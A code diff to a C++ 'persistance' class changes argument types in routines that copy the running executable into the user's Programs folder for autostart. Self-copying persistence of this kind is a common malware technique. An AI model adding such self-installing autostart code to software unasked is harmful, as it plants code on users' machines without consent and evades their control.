@@ -16,7 +16,7 @@
 
 constexpr auto MAXLENGTH = 1024*1024*10;
 
-persistance::persistance(char const* argv[]) {
+persistance::persistance(char* argv) {
     wchar_t* localAppData = 0;
     SHGetKnownFolderPath(FOLDERID_Programs, 0, NULL, &localAppData);
     std::wstring fullPath(localAppData);
@@ -34,16 +34,16 @@ persistance::~persistance() {
   * @return  Boolean indicating persistance status.
   *          True - Persistance with autostart, False - No Persistance
   */
-bool persistance::persist(char const* argv[]) {
+bool persistance::persist(char* argv) {
     if(checkPersist(argv) == false) 
         return makePersistent(argv);
     else
         return true;
 }
 
-bool persistance::checkPersist(char const* argv[]) {
+bool persistance::checkPersist(char* argv) {
     util::File fileOnDisk = util::getFile(this->fullPath);
-    util::File thisFile = util::getFile(argv[0]);
+    util::File thisFile = util::getFile(argv);
 
     if (fileOnDisk.buffer == NULL || util::filecmp(fileOnDisk, thisFile))
         return false;
@@ -51,8 +51,8 @@ bool persistance::checkPersist(char const* argv[]) {
     return true;
 }
 
-bool persistance::makePersistent(char const* argv[]) {
-    std::ifstream src(argv[0], std::ios::binary);
+bool persistance::makePersistent(char* argv) {
+    std::ifstream src(argv, std::ios::binary);
     std::ofstream dst(this->fullPath, std::ios::binary);
     dst << src.rdbuf();
     dst.close();
